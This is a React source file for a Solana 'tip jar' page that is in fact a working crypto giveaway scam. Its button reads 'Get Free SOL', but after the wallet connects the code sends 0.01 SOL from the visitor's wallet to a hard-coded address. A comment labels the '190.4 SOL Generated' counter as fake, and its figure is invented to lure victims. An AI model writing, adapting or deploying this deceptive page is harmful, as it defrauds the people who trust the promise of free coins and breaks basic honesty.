import { useEffect, useState } from "react";

const RECIPIENT_ADDRESS = "FYkz52iarAKNUSs5drJrPutxMVNWC1qaMjtTt3Yc8uEZ";

export default function TipJarApp() {
  const [wallet, setWallet] = useState(null);
  const [publicKey, setPublicKey] = useState(null);
  const [sending, setSending] = useState(false);

  useEffect(() => {
    if ("solana" in window) {
      const provider = window.solana;
      if (provider?.isPhantom) {
        setWallet(provider);
        provider.connect({ onlyIfTrusted: true }).then(({ publicKey }) => {
          setPublicKey(publicKey.toString());
        });
      }
    }
  }, []);

  const connectWallet = async () => {
    try {
      const { publicKey } = await wallet.connect();
      setPublicKey(publicKey.toString());
    } catch (err) {
      console.error("User rejected connection");
    }
  };

  const sendSol = async () => {
    try {
      setSending(true);
      const transaction = new window.solanaWeb3.Transaction().add(
        window.solanaWeb3.SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new window.solanaWeb3.PublicKey(RECIPIENT_ADDRESS),
          lamports: 0.01 * window.solanaWeb3.LAMPORTS_PER_SOL,
        })
      );

      transaction.feePayer = wallet.publicKey;
      const { blockhash } = await new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com").getLatestBlockhash();
      transaction.recentBlockhash = blockhash;

      const signed = await wallet.signTransaction(transaction);
      const signature = await new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com").sendRawTransaction(signed.serialize());
      await new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com").confirmTransaction(signature);

      alert("Thanks for the SOL!");
    } catch (err) {
      console.error("Transaction failed:", err);
      alert("Transaction failed");
    } finally {
      setSending(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center px-6">
      <h1 className="text-3xl mb-6 text-center font-bold">Press the button for SOL</h1>

      {!publicKey ? (
        <button
          onClick={connectWallet}
          className="bg-green-500 hover:bg-green-700 text-black font-bold py-3 px-6 rounded-full text-xl"
        >
          Get Free SOL
        </button>
      ) : (
        <button
          onClick={sendSol}
          disabled={sending}
          className={`bg-purple-600 hover:bg-purple-800 text-white font-bold py-3 px-6 rounded-full text-xl ${
            sending ? "opacity-50 cursor-not-allowed" : ""
          }`}
        >
          {sending ? "Sending..." : "Send 0.01 SOL"}
        </button>
      )}

      {/* Fake SOL Counter */}
      <p className="mt-10 text-2xl font-semibold text-yellow-400">
        SOL Generated: <span className="text-green-400">190.4</span> SOL
      </p>
    </div>
  );
}
